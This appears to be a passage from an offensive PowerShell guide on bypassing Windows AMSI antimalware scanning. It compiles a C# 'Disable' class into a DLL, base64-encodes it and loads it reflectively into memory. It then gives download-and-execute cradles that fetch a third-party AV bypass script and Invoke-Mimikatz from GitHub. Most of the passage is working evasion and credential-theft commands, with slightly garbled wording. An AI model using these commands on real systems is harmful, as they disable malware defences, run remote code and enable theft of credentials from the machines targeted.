To load it into Powershell we can use its native (.NET) API:
```
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll")) 
[BP.AMS]::Disable()
```

encode the entire DLL to base64 and create a script that will automatically reflect it to memory and execute it. To encode the dll to Then base64 I used this command.
```
$OriginalCommand = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\Source.dll"));$OriginalCommand
```

Loadoad it into memory

```
[Reflection.Assembly]::Load([Convert]::FromBase64String($OriginalCommand)) | Out-Null
```
### AMSI Bypassing  By using Third Party
```
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1')
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
powershell get-item function:
```
